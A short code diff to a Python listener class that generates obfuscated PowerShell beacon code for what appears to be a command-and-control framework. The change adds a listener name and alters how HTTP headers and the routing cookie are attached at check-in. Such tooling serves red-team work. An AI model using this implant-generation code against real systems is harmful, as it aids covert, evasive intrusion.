@@ -784,6 +784,7 @@ class Listener:
                 listener_dict = """
 @{{
     delay = {delay}
+    name = "{name}"
     jitter = {jitter}
     profile= "{profile}"
     fixed_parameters= @{{
@@ -843,7 +844,7 @@ class Listener:
                                 }}
 
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("User-Agent",$FixedParameters["headers"]["UserAgent"])
-                                $script:Headers.GetEnumerator() | % {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
+                                $FixedParameters["headers"].GetEnumerator() | % {{$"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add($_.Name, $_.Value)}}
                                 $"""+helpers.generate_random_script_var_name("wc")+""".Headers.Add("Cookie",\"""" + self.session_cookie + """=$RoutingCookie")
 
                                 # choose a random valid URI for checkin
